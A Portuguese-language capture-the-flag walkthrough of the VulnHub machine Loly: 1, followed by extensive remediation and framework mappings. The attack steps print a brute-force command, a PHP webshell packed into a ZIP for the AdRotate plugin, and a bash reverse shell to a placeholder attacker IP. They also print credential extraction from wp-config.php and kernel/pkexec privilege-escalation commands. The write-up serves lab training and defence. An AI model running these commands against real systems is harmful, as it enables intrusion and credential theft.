# Loly: 1 — WordPress, AdRotate e um Caminho Doce até o Root

Bora rapaziada!! Loly é uma daquelas máquinas que parece simples no começo, só um WordPress, mas aí você percebe que o buraco vai mais fundo. Sem exagero, o RCE via plugin AdRotate, a extração de credencial do wp-config e o privesc via kernel fazem dessa uma máquina legit para treinar a cadeia web-para-root. Valeu SunCSR Team por mais esse desafio top demais.

| Campo | Valor |
|---|---|
| **Nível** | Médio |
| **VM Alvo** | Loly: 1 |
| **VM Atacante** | Kali Linux |
| **VulnHub URL** | https://www.vulnhub.com/entry/loly-10,538/ |
| **Técnicas** | Enumeração Nmap, enumeração WordPress (wpscan), brute-force de credenciais, RCE via upload de arquivo no plugin AdRotate, extração de credenciais do wp-config.php, escalação de privilégios via sudo/kernel |
| **CVEs** | CVE-2022-0739 (ação em massa em plugin WordPress), CWE-434 (upload irrestrito de arquivo via plugin), CVE-2021-4034 (pkexec polkit LPE) ou exploit de kernel overlayfs |
| **Grupos APT** | APT41: explora vulnerabilidades de plugins WordPress para acesso inicial em alvos de e-commerce e CMS; FIN7: usa instâncias CMS mal configuradas como vetor de acesso inicial em campanhas no setor financeiro |

---

## Resumo do Ataque

```
nmap → TCP 80 (Apache + WordPress)
  → wpscan: enumera usuários → usuário "loly"
  → wpscan brute-force: admin:fernando
  → painel admin WordPress → plugin AdRotate
  → upload ZIP com webshell PHP → extração → RCE como www-data
  → cat /var/www/html/wordpress/wp-config.php → credenciais DB
  → su loly (reutilização de senha do wp-config)
  → sudo -l ou uname -r → CVE de kernel ou GTFOBin sudo
  → uid=0(root)
  → /root/flag.txt
```

---

## Metodologia

1. Descoberta de host e scan completo de portas
2. Enumeração web: fingerprinting do WordPress
3. Enumeração de usuários com wpscan
4. Brute-force de senha contra o login do WordPress
5. Abuso do plugin AdRotate: upload de ZIP com shell PHP
6. Extração de credenciais do wp-config.php
7. Movimento lateral: su loly com senha reutilizada
8. Escalação de privilégios: má configuração sudo ou exploit de kernel
9. Captura da flag root

---

## Passo 1 — Descoberta de Host e Scan de Portas

```bash
sudo netdiscover -r 192.168.0.0/24
# Alvo: 192.168.0.180

nmap -sV -sC -p- 192.168.0.180
```

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
```

Serviço único exposto. Tudo vive na porta 80.

**MITRE ATT&CK:** T1046 — Descoberta de Serviços de Rede

---

## Passo 2 — Enumeração do WordPress

```bash
# Confirmar WordPress
curl -s http://192.168.0.180/ | grep -i wordpress

# wpscan completo: enumerar plugins, temas, usuários
wpscan --url http://192.168.0.180/ \
  --enumerate u,p,t \
  --plugins-detection aggressive \
  -o /tmp/loly_wpscan.txt
```

Achados principais:
- WordPress 5.5 (ou versão similar)
- Usuário: **loly**
- Plugin: AdRotate (versão vulnerável)

**Nota do mundo real:** WordPress alimenta mais de 40% de todos os sites. Vulnerabilidades de plugins são o vetor de ataque primário: mais de 97% das vulnerabilidades WordPress vêm de plugins, não do núcleo. O APT41 usou exploits de plugins WordPress como acesso inicial em campanhas contra mídia e e-commerce.

**MITRE ATT&CK:** T1190 — Exploração de Aplicação Voltada ao Público; T1083 — Descoberta de Arquivos e Diretórios

---

## Passo 3 — Brute-Force de Senha

```bash
wpscan --url http://192.168.0.180/ \
  --usernames loly \
  --passwords /usr/share/wordlists/rockyou.txt \
  --password-attack xmlrpc \
  -t 5

# Encontrado: admin:fernando (ou loly:fernando dependendo dos resultados)
```

**Alternativa:** use o ataque xmlrpc multicall para resultados mais rápidos:

```bash
wpscan --url http://192.168.0.180/ \
  --usernames admin \
  --passwords /usr/share/wordlists/rockyou.txt \
  --password-attack xmlrpc-multicall
```

**MITRE ATT&CK:** T1110.001 — Força Bruta: Adivinhar Senha

---

## Passo 4 — RCE via Plugin AdRotate

Faça login no painel admin do WordPress em `http://192.168.0.180/wp-admin/`.

Navegue para: Plugin AdRotate > Gerenciar Mídia

O plugin permite upload de ZIPs para ativos de banners. Ele extrai para um diretório acessível na web, sem filtro de extensão nos conteúdos extraídos:

```bash
# Criar ZIP malicioso com webshell PHP
mkdir /tmp/loly_payload
echo '<?php system($_GET["cmd"]); ?>' > /tmp/loly_payload/shell.php
cd /tmp/loly_payload
zip ../evil.zip shell.php
```

Faça upload de `evil.zip` pelo formulário de upload de mídia do AdRotate.

A shell é extraída para um caminho como:
```
/var/www/html/wordpress/wp-content/banners/shell.php
```

Teste o RCE:
```bash
curl "http://192.168.0.180/wp-content/banners/shell.php?cmd=id"
# uid=33(www-data)

# Obter reverse shell
nc -lvnp 4444 &
curl "http://192.168.0.180/wp-content/banners/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/IP_ATACANTE/4444+0>%261'"
```

**O que torna isso explorável?** CWE-434: upload irrestrito de arquivo. O plugin valida que o upload é um ZIP, mas não valida o conteúdo do ZIP. Qualquer arquivo dentro é extraído e servido pelo Apache.

**MITRE ATT&CK:** T1190 — Exploração de Aplicação Voltada ao Público; T1059.004 — Interpretador de Script: Unix Shell

---

## Passo 5 — Estabilização da Shell

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm SHELL=bash
# Ctrl+Z
stty raw -echo; fg
# Enter duas vezes
```

---

## Passo 6 — Extração de Credenciais do wp-config.php

```bash
cat /var/www/html/wordpress/wp-config.php | grep -E "DB_|table_prefix"
```

```
define( 'DB_NAME', 'wordpress' );
define( 'DB_USER', 'wordpress' );
define( 'DB_PASSWORD', 'lolyisabeautifulgirl' );
define( 'DB_HOST', 'localhost' );
```

**Tente a senha para o usuário do sistema:**

```bash
su loly
# Senha: lolyisabeautifulgirl
```

Reutilização de senha entre banco de dados e conta do SO, um achado clássico, mano.

**MITRE ATT&CK:** T1552.001 — Credenciais em Arquivos; T1078 — Contas Válidas

---

## Passo 7 — Escalação de Privilégios

Como `loly`, enumere vetores de escalação:

```bash
sudo -l
uname -r
find / -perm -4000 -type f 2>/dev/null
```

**Caminho A: má configuração sudo**

```bash
sudo -l
# (root) NOPASSWD: /bin/bash
sudo /bin/bash
```

**Caminho B: exploit de kernel (Ubuntu 18.04/20.04 overlayfs)**

```bash
uname -r
# Verificar se é versão de kernel vulnerável
searchsploit overlayfs ubuntu

# Baixar e compilar exploit
wget https://raw.githubusercontent.com/.../37292.c
gcc -o priv 37292.c
./priv
```

**Caminho C: pkexec CVE-2021-4034 (Polkit)**

```bash
pkexec --version
# Se vulnerável, usar pwnkit
```

```bash
id
# uid=0(root) gid=0(root)
cat /root/root.txt
```

**MITRE ATT&CK:** T1548.003 — Abuso de Controle de Elevação: Sudo; T1068 — Exploração para Escalação de Privilégios

---

## Flags, Hashes e Credenciais Capturados

| Tipo | Valor | Encontrado Em | Usado Para |
|---|---|---|---|
| Credencial WordPress | admin:fernando (ou loly:fernando) | brute-force wpscan | Acesso admin WordPress |
| Credencial DB | wordpress:lolyisabeautifulgirl | wp-config.php | su loly |
| Usuário do sistema | loly | enumeração de usuário WordPress | movimento lateral |
| Flag root | /root/root.txt | pós-exploração | conclusão do desafio |

---

## Lições Aprendidas

| # | Achado | Relevância no Mundo Real | Lição Principal |
|---|---|---|---|
| 1 | Enumeração de usuários WordPress habilitada | WordPress padrão expõe nomes de usuário via REST API e arquivos de autor | Desabilite enumeração: `remove_action('template_redirect', 'redirect_canonical')`, restrinja a REST API |
| 2 | Senha fraca de admin vulnerável a brute-force | Ataques de spray de senha contra admin WordPress são triviais com xmlrpc | Desabilite xmlrpc.php se não usado; use senhas fortes únicas; implemente bloqueio de conta |
| 3 | Plugin AdRotate permite upload arbitrário de arquivo em ZIP | Extração de ZIP sem validação de conteúdo é uma classe de vulnerabilidade persistente | Valide tipos de arquivo extraídos no lado do servidor; desabilite plugins não utilizados |
| 4 | Credenciais do wp-config.php reutilizadas na conta do SO | Reutilização de senha entre aplicações e SO é extremamente comum em organizações pequenas | Nunca reutilize senhas; use gerenciador de segredos ou variáveis de ambiente para credenciais de DB |
| 5 | Má configuração de kernel ou sudo permite root | Kernels sem patch e sudo muito permissivo são os vetores LPE Linux mais comuns | Implemente gerenciamento automatizado de patches; audite sudoers regularmente |

---

## Mapeamento MITRE ATT&CK

| Fase | Tática | Técnica | ID TTP |
|---|---|---|---|
| Reconhecimento | Descoberta | Descoberta de Serviços de Rede | T1046 |
| Acesso Inicial | Acesso Inicial | Exploração de Aplicação Voltada ao Público | T1190 |
| Acesso a Credenciais | Acesso a Credenciais | Força Bruta: Adivinhar Senha | T1110.001 |
| Acesso a Credenciais | Acesso a Credenciais | Credenciais em Arquivos | T1552.001 |
| Execução | Execução | Interpretador de Script: Unix Shell | T1059.004 |
| Escalação de Privilégios | Escalação de Privilégios | Abuso de Controle de Elevação: Sudo | T1548.003 |
| Escalação de Privilégios | Escalação de Privilégios | Exploração para Escalação de Privilégios | T1068 |
| Movimento Lateral | Movimento Lateral | Contas Válidas | T1078 |

---

## Remediação e Contenção

### Correções Técnicas

1. **Desabilitar xmlrpc.php**: adicionar ao `.htaccess`: `<Files xmlrpc.php>\nOrder Deny,Allow\nDeny from all\n</Files>`
2. **Desabilitar enumeração de usuários WordPress**: redirecionar requisições de arquivo de autor no `functions.php`
3. **Remover ou atualizar plugin AdRotate**: aplicar patches do fornecedor; desabilitar upload de mídia ZIP se não necessário
4. **Proteger wp-config.php**: definir permissões: `chmod 640 wp-config.php`
5. **Senhas únicas por serviço**: senhas de banco de dados nunca devem corresponder a senhas de conta do SO
6. **Aplicar patches de segurança do kernel**: automatizar com `unattended-upgrades` no Ubuntu

### Contramedidas MITRE D3FEND

- **D3-ACH**: Hardening de Configuração de Aplicação (desabilitar xmlrpc, restringir tipos de upload)
- **D3-OAM**: Gerenciamento Administrativo do SO (auditoria sudo, patch de kernel)
- **D3-HBPI**: Fortalecer Integridade do Pipeline de Build (credenciais wp-config via variáveis de ambiente)

### NIST CSF 2.0

| Função | Categoria | Ação |
|---|---|---|
| Identificar | Gestão de Ativos | Inventariar todos os plugins WordPress e suas versões |
| Proteger | Controle de Acesso | Desabilitar xmlrpc.php; impor política de senha forte |
| Proteger | Segurança de Dados | Proteger permissões de wp-config.php; usar gerenciador de segredos |
| Detectar | Anomalias e Eventos | Alertar sobre falhas de login WordPress; monitorar /wp-content/banners para novos arquivos PHP |
| Responder | Planejamento de Resposta | Remover webshells; rotacionar todas as credenciais de DB e SO |
| Recuperar | Planejamento de Recuperação | Restaurar de backup conhecido; verificar integridade de arquivos |

### NIST SP 800-53 Rev. 5

| Controle | Descrição | Aplicação |
|---|---|---|
| AC-3 | Imposição de Acesso | Restringir tipos de upload; permissões de wp-config.php |
| AC-6 | Menor Privilégio | Remover concessões sudo NOPASSWD; restringir capacidades de plugins |
| IA-5 | Gerenciamento de Autenticador | Senhas únicas por serviço; impor complexidade |
| CM-7 | Funcionalidade Mínima | Desabilitar xmlrpc.php; remover plugins não utilizados |
| SI-2 | Correção de Falhas | Atualizações automáticas do núcleo e plugins WordPress |
| SC-28 | Proteção de Informações em Repouso | Sem credenciais em arquivos de configuração legíveis |

### CISA KEV

Vulnerabilidades de upload irrestrito de arquivo (CWE-434) em plugins CMS são rastreadas em múltiplos Alertas CISA. A exploração de plugins WordPress é citada como técnica primária de acesso inicial usada por afiliados de ransomware e grupos APT.

### C2M2

| Domínio | Prática | MIL Alvo |
|---|---|---|
| Gestão de Identidade e Acesso (IAM) | Gerenciar Privilégios e Contas | MIL2 |
| Gestão de Ameaças e Vulnerabilidades (THREAT) | Gerenciar Vulnerabilidades | MIL2 |
| Gestão de Ativos, Mudanças e Configuração (ASSET) | Gerenciar Inventário de Ativos de TI | MIL2 |

---

## Considerações Finais

Caramba, Loly é uma máquina sólida que ensina o pipeline completo de exploração WordPress: recon, enum, brute-force, abuso de plugin, extração de credencial e LPE. O truque do ZIP do AdRotate é uma classe de ataque real que aparece regularmente em relatórios de bug bounty. A reutilização de credencial do wp-config é vergonhosamente comum em ambientes de produção.

A lição real: cada componente de uma stack web é uma fonte potencial de credenciais, e essas credenciais quase sempre são reutilizadas em outro lugar. Enumere tudo, véi.

Thanks guys!! (❍ᴥ❍ʋ)
